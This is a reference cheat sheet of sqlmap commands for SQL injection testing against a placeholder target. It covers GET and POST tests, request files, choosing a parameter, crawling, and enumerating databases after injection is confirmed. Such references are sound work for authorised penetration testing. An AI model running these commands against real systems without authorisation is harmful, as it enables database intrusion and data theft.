# sqlmap

<div class="ol-version-note">Syntax can drift between releases. Confirm with the tool's local <code>--version</code> and <code>--help</code> output.</div>

<div class="ol-section-kicker"><span>TOOL</span><strong>SQLMAP</strong></div>

## Basic URL test
```bash
sqlmap -u 'https://<TARGET>/item?id=1' --batch
```
**Tool:** sqlmap · **Platform:** Linux/macOS/Windows · **Tags:** SQLi, GET · **Context:** No auth · **Noise:** Loud

## POST body test
```bash
sqlmap -u 'https://<TARGET>/login' --data='user=test&pass=test' --batch
```
**Tool:** sqlmap · **Platform:** Any · **Tags:** SQLi, POST · **Context:** No auth · **Noise:** Loud

## Request file
```bash
sqlmap -r request.txt --batch
```
**Tool:** sqlmap · **Platform:** Any · **Tags:** Raw Request, SQLi · **Context:** Depends on request · **Noise:** Loud

## Specific parameter
```bash
sqlmap -u 'https://<TARGET>/item?id=1&lang=en' -p id --batch
```
**Tool:** sqlmap · **Platform:** Any · **Tags:** Parameter, SQLi · **Context:** No auth · **Noise:** Loud

## Enumerate databases after confirmation
```bash
sqlmap -u 'https://<TARGET>/item?id=1' --dbs --batch
```
**Tool:** sqlmap · **Platform:** Any · **Tags:** Databases, SQLi · **Context:** No auth · **Noise:** Loud

## Crawl shallowly
```bash
sqlmap -u 'https://<TARGET>/' --crawl=2 --batch
```
**Tool:** sqlmap · **Platform:** Any · **Tags:** Crawl, SQLi · **Context:** No auth · **Noise:** Loud
